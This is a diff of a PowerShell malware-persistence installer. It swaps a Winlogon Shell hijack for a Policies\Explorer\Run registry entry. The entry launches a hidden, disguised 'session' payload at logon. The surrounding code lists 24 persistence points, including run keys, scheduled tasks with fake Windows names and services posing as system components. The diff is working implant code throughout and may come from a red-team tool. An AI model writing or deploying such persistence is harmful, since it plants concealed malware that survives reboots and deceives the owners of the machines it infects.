@@ -4,7 +4,7 @@
 #               T1547.010 T1543.003 T1546.003 T1197
 #
 # 24 persistence locations:
-#   Registry (7): HKLM Run, HKCU Run, WOW64 Run, Userinit, Shell, Active Setup x2
+#   Registry (7): HKLM Run, HKCU Run, WOW64 Run, Userinit, Policies\Explorer\Run, Active Setup x2
 #   Tasks    (8): PerfTrack, USOPrivate, Office16, WindowsUpdate, Defrag, DiskCleanup, NetTrace, Registry
 #   Services (2): CryptSvcMonitor (beacon), WmiPerfSvcHost (session)
 #   Startup  (3): All-users LNK, All-users BAT, Current-user EXE
@@ -175,20 +175,17 @@ if ($p4) {
     } catch { Write-Err "  Winlogon Userinit failed: $_"; $script:Fail++ }
 } else { $script:Fail++ }
 
-# [5] Winlogon Shell append - session
-Write-Info "[5/24] Winlogon Shell -- session"
-$p5 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}winshell-ext.exe")
+# [5] Policies\Explorer\Run - session (Group Policy run key, fires at logon, doesn't touch the shell)
+Write-Info "[5/24] Policies\Explorer\Run -- session"
+$p5 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}policy-svc-helper.exe")
 if ($p5) {
     try {
-        $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-        $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
-        if (-not $curShell) { $curShell = "explorer.exe" }
-        if ($curShell -notlike "*$p5*") {
-            Set-ItemProperty $wlKey -Name "Shell" -Value ($curShell.TrimEnd(',') + ",$p5") -Force
-        }
-        Write-Success "  Winlogon Shell appended: $p5"
+        $polKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
+        if (-not (Test-Path $polKey)) { New-Item -Path $polKey -Force | Out-Null }
+        Set-ItemProperty $polKey -Name "${pfx}WinPolicySvc" -Value "`"$p5`"" -Type String -Force
+        Write-Success "  Policies\Explorer\Run\${pfx}WinPolicySvc -> $p5"
         $script:Ok++
-    } catch { Write-Err "  Winlogon Shell failed: $_"; $script:Fail++ }
+    } catch { Write-Err "  Policies\Explorer\Run failed: $_"; $script:Fail++ }
 } else { $script:Fail++ }
 
 # [6] Active Setup StubPath #1 - beacon
@@ -564,7 +561,7 @@ Write-Host "  [ 1] HKLM Run               -> beacon  (fires at every user logon)
 Write-Host "  [ 2] HKCU Run               -> session (fires at current user logon)"            -ForegroundColor Cyan
 Write-Host "  [ 3] WOW6432Node Run        -> beacon  (fires at every user logon)"              -ForegroundColor Cyan
 Write-Host "  [ 4] Winlogon Userinit      -> beacon  (appended to login chain)"                -ForegroundColor Cyan
-Write-Host "  [ 5] Winlogon Shell         -> session (appended to login chain)"                -ForegroundColor Cyan
+Write-Host "  [ 5] Policies\Explorer\Run  -> session (Group Policy run key, fires at logon)"   -ForegroundColor Cyan
 Write-Host "  [ 6] Active Setup {76E4F460}-> beacon  (first logon per user)"                   -ForegroundColor Cyan
 Write-Host "  [ 7] Active Setup {8A69D345}-> session (first logon per user)"                   -ForegroundColor Cyan
 Write-Host "  --- TASKS (8) ---" -ForegroundColor Magenta
